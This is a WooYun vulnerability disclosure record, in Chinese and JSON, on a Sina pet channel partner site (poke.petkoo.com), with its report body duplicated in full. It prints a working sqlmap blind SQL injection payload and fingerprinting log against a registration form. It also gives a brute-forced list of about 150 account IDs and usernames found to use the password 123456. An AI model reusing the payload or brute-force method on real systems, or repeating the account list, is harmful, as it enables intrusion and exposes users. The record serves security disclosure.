{"id": 80126, "wybug_id": "wooyun-2015-0156589", "wybug_title": "新浪宠物频道多处漏洞打包(对接商户把控不严/IIS枚举/用户密码泄露等潜在威胁)", "wybug_corp": "新浪", "wybug_author": "Aasron", "wybug_date": "2015-11-29 09:22", "wybug_open_date": "2016-01-17 10:46", "wybug_type": "账户体系控制不严", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["用户敏感信息泄露", "认证缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向公众公开  简要描述： 新浪&sina,对接的某个商户的问题 详细说明：  新浪某个宠物频道的注入，实际上是接入商户的问题\nhttp://pet.sina.com.cn\n\n\n\n\n\nhttp://poke.petkoo.com/Member/Register.shtml\n在注册时进行抓包\n#1 注入参数:tbLoginName\n\n#2 注入参数:uName\n\nParameter: tbLoginName (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: btMemberAdd=%cd%ac%d2%e2%b7%fe%ce%f1%cc%f5%bf%ee%a3%ac%cc%e1%bd%bb%d7%a2%b2%e1%d0%c5%cf%a2&checkbox=on&tbDisplayName=oxpqyjvj&tbEmail=sample@email.tst&tbLoginName='+convert(int,CHAR(52)+CHAR(67)+CHAR(117)+CHAR(71)+CHAR(49)+CHAR(85)+CHAR(53)+CHAR(117)+CHAR(113)+CHAR(67)+CHAR(113))+'' AND 9044=9044 AND 'TQKB'='TQKB&tbPassword=g00dPa$$w0rD&tbPasswordEnter=g00dPa$$w0rD&txt_end=1&__EVENTARGUMENT=&__EVENTTARGET=&__EVENTVALIDATION=/wEWCAKO4q7KDgK39K/wCQLV4ZnDDwK3jsrkBALL3s+dCwKMqLLaDgKtm4ayCQLzksGwBbe1PjPqKSMFuexgTs5U4DbRR+01&__VIEWSTATE=/wEPDwUKLTQ2MzY2MDQxOQ9kFgICAw9kFgYCFw8PFgIeBFRleHQFATJkZAIZDw8WAh8ABQE0ZGQCGw8PFgIfAAUBNmRkZKc/RZq1njNDw4l5g+lrurePVR4t&__VIEWSTATEGENERATOR=F50CAB47---[14:43:21] [INFO] testing Microsoft SQL Server[14:43:21] [INFO] confirming Microsoft SQL Server[14:43:23] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2012\n\n\n对\nhttp://poke.petkoo.com/member/\n的目录枚举，前面由于注入知道是IIS7.0\n\n时间关系，不跑了\n\nPS:我也不懂\n\n明文传输并且无验证机制，用户可爆破，根据规则以123456为密码\n\n下面给出跑出来的账户\n432\tlingqing\t781\tzhangyan\t807\tzhanghua\t886\tzhangbin\t1171\tzhangyan\t1190\tzhangyan\t1207\tzhanghua\t1309\tzhangbin\t1760\tzhangyan\t1836\tzhangyan\t1904\tzhanghua\t2312\tzhangbin\t259\tzhangying\t869\tzhangming\t942\tyangyan\t1262\tzhangying\t1286\tzhangming\t1336\tzhangying\t1382\tyangyan\t1514\tzhangying\t1630\tyangyan\t2124\tzhangying\t2220\tzhangming\t2420\tzhangying\t2604\tyangyan\t3132\tzhangying\t3596\tyangyan\t671\tchenfeng\t800\tchenjing\t813\tlichao\t819\twangling\t929\tchenling\t961\tyangfang\t1070\tyangling\t1127\tyanghong\t1196\tchenjing\t1213\tlichao\t1221\twangling\t1362\tchenling\t1411\tyangfang\t1548\tyangling\t1626\tyanghong\t1860\tchenjing\t1928\tlichao\t1960\twangling\t2524\tchenling\t2720\tyangfang\t3268\tyangling\t3580\tyanghong\t17\ttest \t18\t123456 \t56\tlufei\t359\txiaowei\t574\tlixiang\t615\tliulian\t769\tlimin\t831\twangxin\t840\tzhangyu\t861\tliuying\t895\twanglin\t1158\tlimin\t1234\twangxin\t1246\tzhangyu\t1277\tliuying\t1319\twanglin\t1391\tliuying\t1464\twanglin\t1495\tzhangyu\t1530\tlixiang\t1576\twangxin\t1616\tzhangyu\t1708\tlimin\t1963\twling\t2012\twangxin\t2060\tzhangyu\t2184\tliuying\t2352\twanglin\t2640\tliuying\t2932\twanglin\t3056\tzhangyu\t3196\tlixiang\t3380\twangxin\t3540\tzhangyu\t3\ttest\t30\tyuanyi\t414\tlichun\t372\tlizhi\t783\tliyan\t787\tlixia\t1174\tliyan\t1181\tlixia\t1217\tliyan\t1556\tliyan\t1772\tliyan\t1800\tlixia\t1944\tliyan\t2690\twjg\t2838\tlyy\t2858\tztt\t3154\tlyy\t3300\tliyan\t3350\tldd\t788\tlili\t833\tlibo\t1182\tlili\t1237\tlibo\t1266\tlili\t1610\tlibo\t1646\tww\t1706\twm\t1804\tlili\t2024\tlibo\t2140\tlili\t2482\twm\t3278\typ\t3318\twm\t3516\tlibo\n\n\n\n\nPS:对接入的商户而言也需要严格规范，小问题大危害   漏洞证明：  新浪某个宠物频道的注入，实际上是接入商户的问题\nhttp://pet.sina.com.cn\n\n\n\n\n\nhttp://poke.petkoo.com/Member/Register.shtml\n在注册时进行抓包\n#1 注入参数:tbLoginName\n\n#2 注入参数:uName\n\nParameter: tbLoginName (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: btMemberAdd=%cd%ac%d2%e2%b7%fe%ce%f1%cc%f5%bf%ee%a3%ac%cc%e1%bd%bb%d7%a2%b2%e1%d0%c5%cf%a2&checkbox=on&tbDisplayName=oxpqyjvj&tbEmail=sample@email.tst&tbLoginName='+convert(int,CHAR(52)+CHAR(67)+CHAR(117)+CHAR(71)+CHAR(49)+CHAR(85)+CHAR(53)+CHAR(117)+CHAR(113)+CHAR(67)+CHAR(113))+'' AND 9044=9044 AND 'TQKB'='TQKB&tbPassword=g00dPa$$w0rD&tbPasswordEnter=g00dPa$$w0rD&txt_end=1&__EVENTARGUMENT=&__EVENTTARGET=&__EVENTVALIDATION=/wEWCAKO4q7KDgK39K/wCQLV4ZnDDwK3jsrkBALL3s+dCwKMqLLaDgKtm4ayCQLzksGwBbe1PjPqKSMFuexgTs5U4DbRR+01&__VIEWSTATE=/wEPDwUKLTQ2MzY2MDQxOQ9kFgICAw9kFgYCFw8PFgIeBFRleHQFATJkZAIZDw8WAh8ABQE0ZGQCGw8PFgIfAAUBNmRkZKc/RZq1njNDw4l5g+lrurePVR4t&__VIEWSTATEGENERATOR=F50CAB47---[14:43:21] [INFO] testing Microsoft SQL Server[14:43:21] [INFO] confirming Microsoft SQL Server[14:43:23] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, ASP.NET 2.0.50727, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2012\n\n\n对\nhttp://poke.petkoo.com/member/\n的目录枚举，前面由于注入知道是IIS7.0\n\n时间关系，不跑了\n\nPS:我也不懂\n\n明文传输并且无验证机制，用户可爆破，根据规则以123456为密码\n\n下面给出跑出来的账户\n432\tlingqing\t781\tzhangyan\t807\tzhanghua\t886\tzhangbin\t1171\tzhangyan\t1190\tzhangyan\t1207\tzhanghua\t1309\tzhangbin\t1760\tzhangyan\t1836\tzhangyan\t1904\tzhanghua\t2312\tzhangbin\t259\tzhangying\t869\tzhangming\t942\tyangyan\t1262\tzhangying\t1286\tzhangming\t1336\tzhangying\t1382\tyangyan\t1514\tzhangying\t1630\tyangyan\t2124\tzhangying\t2220\tzhangming\t2420\tzhangying\t2604\tyangyan\t3132\tzhangying\t3596\tyangyan\t671\tchenfeng\t800\tchenjing\t813\tlichao\t819\twangling\t929\tchenling\t961\tyangfang\t1070\tyangling\t1127\tyanghong\t1196\tchenjing\t1213\tlichao\t1221\twangling\t1362\tchenling\t1411\tyangfang\t1548\tyangling\t1626\tyanghong\t1860\tchenjing\t1928\tlichao\t1960\twangling\t2524\tchenling\t2720\tyangfang\t3268\tyangling\t3580\tyanghong\t17\ttest \t18\t123456 \t56\tlufei\t359\txiaowei\t574\tlixiang\t615\tliulian\t769\tlimin\t831\twangxin\t840\tzhangyu\t861\tliuying\t895\twanglin\t1158\tlimin\t1234\twangxin\t1246\tzhangyu\t1277\tliuying\t1319\twanglin\t1391\tliuying\t1464\twanglin\t1495\tzhangyu\t1530\tlixiang\t1576\twangxin\t1616\tzhangyu\t1708\tlimin\t1963\twling\t2012\twangxin\t2060\tzhangyu\t2184\tliuying\t2352\twanglin\t2640\tliuying\t2932\twanglin\t3056\tzhangyu\t3196\tlixiang\t3380\twangxin\t3540\tzhangyu\t3\ttest\t30\tyuanyi\t414\tlichun\t372\tlizhi\t783\tliyan\t787\tlixia\t1174\tliyan\t1181\tlixia\t1217\tliyan\t1556\tliyan\t1772\tliyan\t1800\tlixia\t1944\tliyan\t2690\twjg\t2838\tlyy\t2858\tztt\t3154\tlyy\t3300\tliyan\t3350\tldd\t788\tlili\t833\tlibo\t1182\tlili\t1237\tlibo\t1266\tlili\t1610\tlibo\t1646\tww\t1706\twm\t1804\tlili\t2024\tlibo\t2140\tlili\t2482\twm\t3278\typ\t3318\twm\t3516\tlibo\n\n\n\n\nPS:对接入的商户而言也需要严格规范，小问题大危害   修复方案：  1.验证机制2.对接商户接口进行整改   版权声明：转载请注明来源 Aasron@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-12-03 10:45 厂商回复： 感谢对新浪安全的支持，此为合作方的安全问题，将通知合作方修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}